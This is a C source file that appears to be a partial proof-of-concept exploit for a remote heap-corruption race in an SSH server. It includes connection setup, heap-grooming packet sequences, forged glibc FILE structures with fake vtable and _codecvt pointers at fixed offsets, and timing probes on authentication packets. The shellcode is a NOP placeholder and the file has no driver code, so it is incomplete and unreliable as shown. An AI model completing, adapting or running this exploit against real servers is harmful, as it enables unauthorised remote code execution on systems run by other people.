#include "helper.h"
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>  // Tambahkan header untuk fcntl
#include <errno.h>  // Tambahkan header untuk errno

#define MAX_PACKET_SIZE (256 * 1024)

// Shellcode placeholder (replace with actual shellcode)
unsigned char shellcode[] = "\x90\x90\x90\x90";

uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof(GLIBC_BASES) / sizeof(GLIBC_BASES[0]);

int setup_connection(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    // Set socket to non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    return sock;
}

void send_packet(int sock, unsigned char packet_type, const unsigned char *data, size_t len) {
    unsigned char packet[MAX_PACKET_SIZE];
    size_t packet_len = len + 5;

    packet[0] = (packet_len >> 24) & 0xFF;
    packet[1] = (packet_len >> 16) & 0xFF;
    packet[2] = (packet_len >> 8) & 0xFF;
    packet[3] = packet_len & 0xFF;
    packet[4] = packet_type;

    memcpy(packet + 5, data, len);

    if (send(sock, packet, packet_len, 0) < 0) {
        perror("send_packet");
    }
}

void prepare_heap(int sock) {
    // Packet a: Allocate and free tcache chunks
    for (int i = 0; i < 10; i++) {
        unsigned char tcache_chunk[64];
        memset(tcache_chunk, 'A', sizeof(tcache_chunk));
        send_packet(sock, 5, tcache_chunk, sizeof(tcache_chunk));
        // These will be freed by the server, populating tcache
    }

    // Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
    for (int i = 0; i < 27; i++) {
        // Allocate large chunk (~8KB)
        unsigned char large_hole[8192];
        memset(large_hole, 'B', sizeof(large_hole));
        send_packet(sock, 5, large_hole, sizeof(large_hole));

        // Allocate small chunk (320B)
        unsigned char small_hole[320];
        memset(small_hole, 'C', sizeof(small_hole));
        send_packet(sock, 5, small_hole, sizeof(small_hole));
    }

    // Packet c: Write fake headers, footers, vtable and _codecvt pointers
    for (int i = 0; i < 27; i++) {
        unsigned char fake_data[4096];
        create_fake_file_structure(fake_data, sizeof(fake_data), GLIBC_BASES[0]);
        send_packet(sock, 5, fake_data, sizeof(fake_data));
    }

    // Packet d: Ensure holes are in correct malloc bins (send ~256KB string)
    unsigned char large_string[MAX_PACKET_SIZE - 1];
    memset(large_string, 'E', sizeof(large_string));
    send_packet(sock, 5, large_string, sizeof(large_string));
}

void create_fake_file_structure(unsigned char *data, size_t size, uint64_t glibc_base) {
    memset(data, 0, size);

    struct {
        void *_IO_read_ptr;
        void *_IO_read_end;
        void *_IO_read_base;
        void *_IO_write_base;
        void *_IO_write_ptr;
        void *_IO_write_end;
        void *_IO_buf_base;
        void *_IO_buf_end;
        void *_IO_save_base;
        void *_IO_backup_base;
        void *_IO_save_end;
        void *_markers;
        void *_chain;
        int _fileno;
        int _flags;
        int _mode;
        char _unused2[40];
        void *_vtable_offset;
    } *fake_file = (void *)data;

    // Set _vtable_offset to 0x61 as described in the advisory
    fake_file->_vtable_offset = (void *)0x61;

    // Set up fake vtable and _codecvt pointers
    *(uint64_t *)(data + size - 16) = glibc_base + 0x21b740; // fake vtable (_IO_wfile_jumps)
    *(uint64_t *)(data + size - 8) = glibc_base + 0x21d7f8; // fake _codecvt
}

void time_final_packet(int sock, double *parsing_time) {
    double time_before = measure_response_time(sock, 1);
    double time_after = measure_response_time(sock, 2);
    *parsing_time = time_after - time_before;

    printf("Estimated parsing time: %.6f seconds\n", *parsing_time);
}

double measure_response_time(int sock, int error_type) {
    unsigned char error_packet[1024];
    size_t packet_size;

    if (error_type == 1) {
        // Error before sshkey_from_blob
        packet_size = snprintf((char *)error_packet, sizeof(error_packet), "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3");
    } else {
        // Error after sshkey_from_blob
        packet_size = snprintf((char *)error_packet, sizeof(error_packet), "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9");
    }

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    send_packet(sock, 50, error_packet, packet_size); // SSH_MSG_USERAUTH_REQUEST

    char response[1024];
    ssize_t received;
    do {
        received = recv(sock, response, sizeof(response), 0);
    } while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    clock_gettime(CLOCK_MONOTONIC, &end);

    double elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    return elapsed;
}
